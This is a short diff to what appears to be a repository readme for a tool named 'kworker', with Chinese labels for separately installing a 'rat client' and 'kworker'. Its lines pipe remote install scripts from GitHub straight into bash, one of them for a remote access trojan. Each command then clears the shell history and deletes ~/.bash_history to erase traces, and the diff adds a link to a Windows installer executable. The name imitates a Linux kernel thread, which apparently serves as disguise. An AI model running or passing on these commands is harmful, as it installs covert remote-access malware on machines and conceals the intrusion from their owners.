@@ -6,6 +6,8 @@ bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworke
 单独install rat client
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/scripts/install_rat.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
+https://github.com/thm1472581-dotcom/kworker/tree/master/win/install/Install_v2.exe
+
 单独install kworker
 bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/scripts/install.sh)" && history -c && history -cw && rm -f ~/.bash_history
 
